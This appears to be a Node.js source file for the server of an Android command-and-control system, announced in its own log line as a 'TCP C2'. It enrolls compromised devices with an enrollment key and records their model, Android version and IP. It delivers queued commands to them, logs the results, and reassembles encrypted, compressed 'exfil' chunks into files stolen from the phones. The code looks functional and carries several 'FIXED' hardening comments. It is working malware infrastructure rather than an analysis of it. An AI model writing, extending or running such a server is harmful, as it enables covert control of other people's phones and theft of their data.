const { dbAll, dbRun } = require("./db");
const { clients, clientKeys, exfilSessions, xorCrypt, performKeyExchange, aesDecrypt, sendFramed } = require("./crypto");
const { auditLog } = require("./db");
const config = require("./config");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");

function handleClientMessage(msg, sock, remoteIP, aesKey) {
    if (msg.type === "enroll") {
        if (msg.enrollKey !== config.enrollKey) { console.log("[!] Invalid enrollment key from", remoteIP); sock.destroy(); return; }
        const uid = msg.uid || crypto.randomUUID();
        dbRun("INSERT INTO clients (uid, device_model, android_version, manufacturer, ip, first_seen, last_seen, online) VALUES (?,?,?,?,?,?,?,1) ON CONFLICT(uid) DO UPDATE SET device_model=excluded.device_model, android_version=excluded.android_version, manufacturer=excluded.manufacturer, ip=excluded.ip, last_seen=excluded.last_seen, online=1",
            [uid, msg.model || "unknown", msg.android || "unknown", msg.manufacturer || "unknown", remoteIP, Date.now(), Date.now()]);
        clients.set(uid, sock); clientKeys.set(uid, aesKey);
        auditLog("client_enroll", "system", uid, remoteIP, { model: msg.model }, true);
        dbAll("SELECT * FROM pending_tasks WHERE client_uid=? AND delivered=0", [uid]).then(tasks => {
            for (const t of tasks) { sendFramed(sock, { cmd: t.cmd, ...JSON.parse(t.data || "{}") }, aesKey); dbRun("UPDATE pending_tasks SET delivered=1 WHERE id=?", [t.id]); }
        });
        sock.on("close", () => { clients.delete(uid); clientKeys.delete(uid); dbRun("UPDATE clients SET online=0, last_seen=? WHERE uid=?", [Date.now(), uid]); });
        sock.on("error", () => { clients.delete(uid); clientKeys.delete(uid); dbRun("UPDATE clients SET online=0 WHERE uid=?", [uid]); });
    } else if (msg.type === "result") {
        dbRun("INSERT INTO logs (client_uid, cmd, result, timestamp) VALUES (?,?,?,?)", [msg.uid || "unknown", msg.cmd || "unknown", JSON.stringify(msg.output || "").substring(0, 10000), Date.now()]);
    } else if (msg.type === "file") {
        const { safeFilename } = require("./validation");
        const fname = safeFilename(msg.uid) + "_" + Date.now() + "_" + safeFilename(msg.name);
        const fpath = path.join(__dirname, "..", "uploads", fname);
        const resolved = path.resolve(fpath);
        const uploadsDir = path.resolve(path.join(__dirname, "..", "uploads"));
        // FIXED: consistent path.sep suffix for traversal check
        if (!resolved.startsWith(uploadsDir + path.sep)) { console.error("[!] Path traversal blocked"); return; }
        fs.writeFileSync(fpath, Buffer.from(msg.data, "base64"));
        dbRun("INSERT INTO files (client_uid, filename, filepath, filesize, file_type, timestamp) VALUES (?,?,?,?,?,?)", [msg.uid, safeFilename(msg.name), fpath, msg.size || 0, msg.file_type || "file", Date.now()]);
    } else if (msg.type === "exfil_chunk") {
        const sessionKey = msg.uid + "_" + msg.session;
        if (!exfilSessions.has(sessionKey)) exfilSessions.set(sessionKey, { uid: msg.uid, cmd: msg.cmd, fileType: msg.file_type, chunks: [], total: msg.total });
        const session = exfilSessions.get(sessionKey);
        // FIXED: non-sparse array to avoid join() gaps with out-of-order chunks
        while (session.chunks.length <= msg.seq) session.chunks.push(undefined);
        session.chunks[msg.seq] = msg.data;
        if (session.chunks.filter(c => c !== undefined).length === session.total) {
            const fullB64Data = session.chunks.join("");
            const encryptedData = Buffer.from(fullB64Data, "base64");
            const decryptedData = aesDecrypt(encryptedData, aesKey);
            const decompressedData = zlib.inflateSync(decryptedData);
            const { safeFilename } = require("./validation");
            const fname = safeFilename(session.uid) + "_" + Date.now() + "_" + safeFilename(session.cmd) + ".bin";
            const fpath = path.join(__dirname, "..", "uploads", fname);
            fs.writeFileSync(fpath, decompressedData);
            dbRun("INSERT INTO files (client_uid, filename, filepath, filesize, file_type, timestamp) VALUES (?,?,?,?,?,?)", [session.uid, fname, fpath, decompressedData.length, session.fileType, Date.now()]);
            exfilSessions.delete(sessionKey);
        }
    }
}

function startTcpServer() {
    const net = require("net");
    let activeConnections = 0;
    const server = net.createServer((sock) => {
        if (activeConnections >= config.maxConnections) { sock.destroy(); return; }
        activeConnections++; sock.on("close", () => activeConnections--);
        const remoteIP = sock.remoteAddress.replace("::ffff:", "");
        let keyexDone = false;
        // FIXED: setTimeout stored in variable, cleared on success
        const handshakeTimeout = setTimeout(() => { if (!keyexDone) sock.destroy(); }, config.handshakeTimeoutMs);
        performKeyExchange(sock, (aesKey, leftover) => {
            keyexDone = true; clearTimeout(handshakeTimeout); sock.setTimeout(0);
            let frameBuffer = Buffer.alloc(0);
            const processFrames = () => {
                while (frameBuffer.length >= 4) {
                    const expectedLen = frameBuffer.readUInt32BE(0);
                    if (expectedLen > config.maxFrameSize) { console.error("[!] Oversized frame from", remoteIP); sock.destroy(); return; }
                    if (frameBuffer.length < 4 + expectedLen) break;
                    const encryptedPayload = frameBuffer.subarray(4, 4 + expectedLen);
                    frameBuffer = frameBuffer.subarray(4 + expectedLen);
                    try { const msg = JSON.parse(aesDecrypt(encryptedPayload, aesKey).toString()); handleClientMessage(msg, sock, remoteIP, aesKey); }
                    catch (e) { console.error("Parse error:", e.message); }
                }
            };
            sock.on("data", (rawChunk) => { frameBuffer = Buffer.concat([frameBuffer, rawChunk]); processFrames(); });
            if (leftover && leftover.length > 0) { frameBuffer = leftover; processFrames(); }
        });
    });
    server.listen(config.socketPort, () => console.log("[*] TCP C2 listening on " + config.socketPort));
    return server;
}

module.exports = { startTcpServer, handleClientMessage };
